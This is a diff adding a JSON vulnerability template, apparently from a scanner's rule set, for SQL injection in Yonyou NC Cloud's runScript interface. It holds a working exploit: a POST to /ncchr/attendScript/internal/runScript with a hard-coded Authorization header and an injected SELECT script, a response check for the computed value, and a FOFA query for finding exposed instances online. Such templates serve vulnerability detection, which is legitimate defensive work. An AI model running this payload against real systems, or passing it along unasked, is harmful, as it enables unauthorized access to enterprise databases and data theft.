@@ -1,0 +1,39 @@
+{
+  "product": "用友NC Cloud",
+  "vul_name": "用友NC Cloud runScript接口SQL注入",
+  "type": "SQL注入",
+  "vul_id": [],
+  "level": 3,
+  "vul_desc": "用友 NC Cloud，大型企业数字化平台， 聚焦数字化管理、数字化经营、数字化商业，帮助大型企业实现 人、财、物、客的全面数字化，从而驱动业务创新与管理变革，与企业管理者一起重新定义未来的高度。为客户提供面向大型企业集团、制造业、消费品、建筑、房地产、金融保险等14个行业大类，68个细分行业，涵盖数字营销、智能制造、财务共享、数字采购等18大解决方案，帮助企业全面落地数字化。用友NC runScript接口存在SQL注入漏洞",
+  "version": "",
+  "note": "",
+  "search": {
+    "FOFA": "body=\"UClient.dmg\"||app=\"用友-U8-Cloud\""
+  },
+  "protocol": "http",
+  "link": "https://mp.weixin.qq.com/s?__biz=MzIxMjEzMDkyMA==&mid=2247485855&idx=1&sn=57b14b10cfc2c52e3e590c252fe44dea&chksm=974b8498a03c0d8ea76ba078805290fa4c191c2e31da49d86f29b05273e71d68a33d2bdd69f8&scene=178&cur_album_id=2873032428486115330#rd",
+  "fix": [
+    "建议联系软件厂商进行处理。"
+  ],
+  "exploit": {
+    "exp": {
+      "method": "post",
+      "follow": false,
+      "path": "/ncchr/attendScript/internal/runScript",
+      "header": {
+        "Authorization": "58e00466213416018d01d15de83b0198"
+      },
+      "data": "key=1&script=select 1,1108*12,user,4,5,6,7,8,9,10 from dual"
+    },
+    "verify": {
+      "path": "",
+      "logic": "and",
+      "check": [
+        {
+          "status": 200,
+          "body": "13296"
+        }
+      ]
+    }
+  }
+}
